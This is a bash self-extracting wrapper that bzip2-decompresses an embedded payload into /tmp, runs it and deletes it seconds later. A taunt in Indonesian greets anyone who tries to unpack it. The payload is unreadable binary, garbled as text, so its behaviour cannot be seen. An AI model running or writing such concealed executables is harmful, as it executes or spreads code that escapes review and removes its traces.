#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY��l 3�}� �����������PT@   �P�=����'t��p�ڂQ<�!�{S)�P�LjmM4ڞI�M��j2=LF�5=5�%L�
ySj���4=M ��   � 	2��)��z�hz� h4       � h44 4�42�  2 2  �SMF��4L�FG�i�LA��F��  ���4���`d>⦆%9����V��B������9$%���AC�邫Z��T�C5r���\`�Xi$�����VO���TD:�O�(�T�#~Q��wf�ߏ#������;NłWG�I�-`2;�T�D ,��]���0fB��q�^N��C7O,ո�&��4� P�Q�jsA�f��I���D��G��n��a������E������潳�K,��r<�l[�X�3E����o\S��rL݊m�5�O�9Nm�"�Ԭ�Pp�4<��4@hs���V�cc�h5���q]��
1��jj�b�(�Ve��ib;�@]x��o�������J���5��� Y+ �14͇��cz���:Y�+'!���5�1z������Q�����rZ���4]'��@�9Nx��$�=�v+"x���ͼ0@cC�/(˛��`��Y�='*
�O1��
E@�ni��ሶ4��CQf��GGǛK[h���� ��SI������19�4DNn�����(���X�W�����[ʙUvV�e��|s��>�rM$�Ͼ����jXI�EDT >I��@�b�x�~7��L���GJW�B��f�U�o�� =c���D��YQUTA19?��95
9K�:�G$�!��P��U�]P�(1�NZX�YD5ݐ���V�$��E����e�1��ƀ �E9��%L>���6c���^̔�&[��D.׵,G.��v,�+m��rn5 T�z��e#sr�
�02E�Gy��R�4��Gq��lLl��\��ύ���s��v��2z l��3wst����"a@�qH���,�*��v6�j��5Z�6h��Ȕ&b"=S/�p�Bqg�m�g�~�6��6e��SWU��[%�J�w@�~ZLVUh·>1�#��ɤ�eY�G�Lȶ�@Rɍ �Ft�pu+�,Ɯ�㕠V�P2r���[��]%0l�HQ=B�qNN}�tKٞ�N�ID��6Jr2瀡��`�)��.U�lAR�t���fq^Z֕# ^ݼ,��"GjZ�I%d��EK�I��T�5��J�
	��L�pH��R�S"a�jb�z�,�Rz�
V�%�t�6��5"����qwn)4�D"�0�X~I%=�JX�&Y��u}`b cj��q)�9\�S=��Ɠ�9OR�E ��k�!ǝ���m
���ߣ�	'9�r�Hh	���5	R�VdAa��at�8�Mo]0I�����:הV��
��P���^9K�v��*-)!n�t���"K; �M���hj����!���$.�@�Ą&%[�D�� ��3�.�p�!���